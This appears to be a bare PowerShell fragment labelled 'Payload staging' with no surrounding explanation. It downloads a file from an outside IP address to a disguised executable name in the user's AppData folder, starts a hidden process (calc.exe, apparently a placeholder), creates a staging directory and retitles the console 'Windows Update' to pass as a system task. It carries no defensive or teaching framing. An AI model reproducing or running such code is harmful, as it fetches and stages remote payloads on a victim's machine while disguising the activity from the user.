
<# Payload staging #> $TransferUrl = 'http://198.51.100.205:8080/stage1.ps1'; $Stage2Path = "$env:APPDATA\svcupdate.exe"; $ConnectionTimeout = 136; Invoke-WebRequest -Uri $TransferUrl -OutFile $Stage2Path -UseBasicParsing; Start-Process -FilePath "calc.exe" -WindowStyle Hidden; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force; $Host.UI.RawUI.WindowTitle = "Windows Update"
